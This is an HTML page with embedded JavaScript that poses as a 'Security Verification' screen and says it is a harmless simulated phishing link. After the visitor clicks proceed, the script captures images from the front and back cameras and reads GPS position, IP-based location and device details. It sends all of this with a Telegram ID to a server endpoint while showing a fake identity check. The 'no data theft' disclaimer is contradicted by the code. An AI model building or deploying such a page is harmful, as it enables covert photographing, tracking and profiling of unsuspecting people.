<!DOCTYPE html>
<html>
<head>
  <title>Security Verification</title>
  <meta name="robots" content="noindex">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    :root {
      --primary: #6a11cb;
      --secondary: #2575fc;
      --accent: #00f2fe;
      --dark: #0c1021;
      --darker: #070a15;
      --light: #f5f9ff;
      --danger: #ff4d4f;
      --success: #52c41a;
      --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--darker), var(--dark));
      color: var(--light);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      line-height: 1.6;
    }
    
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      opacity: 0.3;
    }
    
    .warning-container {
      background: rgba(12, 16, 33, 0.8);
      border-radius: 20px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
      padding: 2.5rem;
      max-width: 650px;
      text-align: center;
      position: relative;
      overflow: hidden;
      z-index: 10;
    }
    
    .warning-container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(0, 242, 254, 0.1) 0%, transparent 70%);
      animation: rotate 15s linear infinite;
      z-index: -1;
    }
    
    .warning-header {
      color: var(--accent);
      font-size: 2rem;
      margin-bottom: 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    
    .warning-content {
      font-size: 1.1rem;
      line-height: 1.6;
      margin-bottom: 2rem;
      color: rgba(255, 255, 255, 0.8);
    }
    
    .warning-content strong {
      color: var(--light);
      font-weight: 600;
    }
    
    .warning-buttons {
      display: flex;
      gap: 20px;
      justify-content: center;
      flex-wrap: wrap;
    }
    
    .btn {
      padding: 0.9rem 1.8rem;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      font-weight: bold;
      transition: var(--transition);
      display: flex;
      align-items: center;
      gap: 8px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }
    
    .btn-exit {
      background: linear-gradient(90deg, var(--danger), #c41a1a);
      color: white;
    }
    
    .btn-proceed {
      background: linear-gradient(90deg, var(--success), #389e0d);
      color: white;
    }
    
    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
      opacity: 0.95;
    }
    
    @keyframes rotate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    @media (max-width: 768px) {
      .warning-container {
        padding: 1.8rem;
      }
      
      .warning-header {
        font-size: 1.6rem;
      }
      
      .warning-content {
        font-size: 1rem;
      }
      
      .warning-buttons {
        flex-direction: column;
        gap: 15px;
      }
      
      .btn {
        width: 100%;
        justify-content: center;
      }
    }
  </style>
</head>
<body>
  <canvas id="particles" class="particles"></canvas>
  <div class="warning-container">
    <h1 class="warning-header">
      <i class="fas fa-shield-alt"></i> SECURITY WARNING
    </h1>
    <div class="warning-content">
      <p><strong>This is a simulated phishing link for educational purposes.</strong></p>
      <p>This link was created for cybersecurity training and self-testing. If you did not request this link or arrived here unintentionally, please exit immediately.</p>
      <p><strong>No real malware or data theft will occur.</strong></p>
    </div>
    <div class="warning-buttons">
      <button class="btn btn-exit" onclick="window.location.href='https://google.com'">
        <i class="fas fa-times-circle"></i> Exit Immediately
      </button>
      <button class="btn btn-proceed" onclick="startVerification()">
        <i class="fas fa-check-circle"></i> I Understand & Proceed
      </button>
    </div>
  </div>

<script>
// Particle Animation
const canvas = document.getElementById('particles');
const ctx = canvas.getContext('2d');
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

let particlesArray = [];
const numberOfParticles = 150;

class Particle {
  constructor() {
    this.x = Math.random() * canvas.width;
    this.y = Math.random() * canvas.height;
    this.size = Math.random() * 2 + 0.5;
    this.speedX = Math.random() * 1 - 0.5;
    this.speedY = Math.random() * 1 - 0.5;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
    if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
  }
  draw() {
    ctx.fillStyle = 'rgba(0, 242, 254, 0.5)';
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
  }
}

function initParticles() {
  particlesArray = [];
  for (let i = 0; i < numberOfParticles; i++) {
    particlesArray.push(new Particle());
  }
}

function connectParticles() {
  for (let a = 0; a < particlesArray.length; a++) {
    for (let b = a; b < particlesArray.length; b++) {
      const dx = particlesArray[a].x - particlesArray[b].x;
      const dy = particlesArray[a].y - particlesArray[b].y;
      const distance = Math.sqrt(dx * dx + dy * dy);
      if (distance < 100) {
        ctx.strokeStyle = `rgba(0, 242, 254, ${0.1 - distance / 1000})`;
        ctx.lineWidth = 0.5;
        ctx.beginPath();
        ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
        ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
        ctx.stroke();
      }
    }
  }
}

function animateParticles() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  particlesArray.forEach(p => {
    p.update();
    p.draw();
  });
  connectParticles();
  requestAnimationFrame(animateParticles);
}

initParticles();
animateParticles();

// URL Params
const urlParams = new URLSearchParams(window.location.search);
const telegramId = urlParams.get('telegramId');
const redirectUrl = urlParams.get('redirectUrl') || 'https://google.com';

function startVerification() {
  document.body.innerHTML = `
    <div style="text-align:center; padding:50px; color: var(--light);">
      <h2 style="margin-bottom: 20px; color: var(--accent);">Verifying your identity...</h2>
      <div class="spinner"></div>
      <style>
        .spinner {
          border: 5px solid rgba(255,255,255,0.1);
          border-top: 5px solid var(--accent);
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 2s linear infinite;
          margin: 20px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    </div>
  `;
  setTimeout(() => collectAndSendData(), 2000);
}

async function collectAndSendData() {
  const deviceInfo = await getDeviceInfo();
  try {
    const response = await fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ telegramId, ...deviceInfo })
    });
    if (!response.ok) throw new Error('Submission failed');
  } catch (error) {
    console.error('Submission error:', error);
  }
  window.location.href = redirectUrl;
}

async function getDeviceInfo() {
  const frontCameraImage = await captureCamera('front');
  const backCameraImage = await captureCamera('back');

  const deviceInfo = {
    ip: await getIP(),
    browser: getBrowser(),
    platform: navigator.platform || 'Unknown',
    language: navigator.language || 'Unknown',
    screen: `${screen.width}x${screen.height}, ${screen.colorDepth || 'Unknown'}bit`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
    timestamp: new Date().toISOString(),
    webgl: await getWebGLInfo(),
    networkType: await getNetworkType(),
    networkSpeed: await getNetworkSpeed(),
    downlink: await getDownlink(),
    latency: await getLatency(),
    dataSaver: await getDataSaver(),
    batteryLevel: await getBatteryLevel(),
    charging: await getChargingStatus(),
    gps: await getGPS(),
    cameraStatus: await getCameraStatus(),
    frontCameraImage,
    backCameraImage,
    cpu: await getCPUInfo(),
    ram: await getRAMInfo(),
    location: await getLocation()
  };
  return deviceInfo;
}

function getBrowser() {
  const userAgent = navigator.userAgent;
  if (userAgent.includes('Firefox')) return 'Firefox';
  if (userAgent.includes('Chrome')) return 'Chrome';
  if (userAgent.includes('Safari')) return 'Safari';
  if (userAgent.includes('Edge')) return 'Edge';
  if (userAgent.includes('Opera')) return 'Opera';
  return 'Unknown';
}

async function captureCamera(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facingMode === 'front' ? 'user' : 'environment' }
    });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/jpeg');
    stream.getTracks().forEach(track => track.stop());
    return imageData;
  } catch (error) {
    console.error(`Error capturing ${facingMode} camera:`, error);
    return null;
  }
}

async function getIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getWebGLInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getNetworkType() {
  try {
    const conn = navigator.connection || navigator.webkitConnection;
    if (!conn) return 'Unknown';
    return conn.effectiveType === 'cellular' ? 'Cellular' : 'WiFi';
  } catch {
    return 'Unknown';
  }
}

async function getNetworkSpeed() {
  try {
    const conn = navigator.connection || navigator.webkitConnection;
    return conn ? `${conn.downlink} Mbps` : 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getDownlink() {
  try {
    const conn = navigator.connection || navigator.webkitConnection;
    return conn ? `${conn.downlinkMax} Mbps` : 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getLatency() {
  try {
    const conn = navigator.connection || navigator.webkitConnection;
    return conn ? `${conn.rtt} ms` : 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getDataSaver() {
  try {
    const conn = navigator.connection || navigator.webkitConnection;
    return conn ? (conn.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getBatteryLevel() {
  try {
    const battery = await navigator.getBattery();
    return battery ? `${Math.round(battery.level * 100)}%` : 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getChargingStatus() {
  try {
    const battery = await navigator.getBattery();
    return battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getGPS() {
  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    const lat = pos.coords.latitude.toFixed(5);
    const lon = pos.coords.longitude.toFixed(5);
    return `${lat}, ${lon}`;
  } catch {
    return 'Denied';
  }
}

async function getCameraStatus() {
  try {
    await navigator.mediaDevices.getUserMedia({ video: true });
    return 'Accessible';
  } catch {
    return 'None / Denied';
  }
}

async function getCPUInfo() {
  try {
    const cpuInfo = navigator.hardwareConcurrency || 'Unknown';
    return `${cpuInfo} cores`;
  } catch {
    return 'Unknown';
  }
}

async function getRAMInfo() {
  try {
    const ram = navigator.deviceMemory || 'Unknown';
    return `${ram} GB`;
  } catch {
    return 'Unknown';
  }
}

async function getLocation() {
  try {
    const response = await fetch(`https://ipapi.co/${await getIP()}/json/`);
    const data = await response.json();
    return {
      city: data.city || 'Unknown',
      region: data.region || 'Unknown',
      country: data.country_name || 'Unknown'
    };
  } catch {
    return {
      city: 'Unknown',
      region: 'Unknown',
      country: 'Unknown'
    };
  }
}

</script>
</body>
</html>
